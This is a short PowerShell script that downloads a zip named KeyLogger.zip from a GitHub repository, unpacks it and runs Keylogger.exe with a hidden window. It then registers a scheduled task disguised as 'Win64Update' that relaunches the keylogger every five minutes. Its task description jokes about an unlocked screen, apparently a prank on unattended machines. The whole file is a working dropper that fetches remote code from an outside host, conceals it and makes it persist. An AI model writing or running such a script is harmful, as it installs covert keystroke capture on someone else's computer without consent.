$FolderName = "C:\temp\"
if (Get-Item -Path $FolderName -ErrorAction Ignore) {
} else {
    New-Item $FolderName -ItemType Directory
}

Invoke-WebRequest -Uri "https://github.com/MartijnJStans/ScreenNotLocked/archive/refs/heads/main.zip" -OutFile "C:\temp\KeyLogger.zip"
Expand-Archive -LiteralPath "C:\temp\KeyLogger.zip"
Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Win64Update" -Description "Hey buddy, Did you forget something? Maybe next time lock your screen"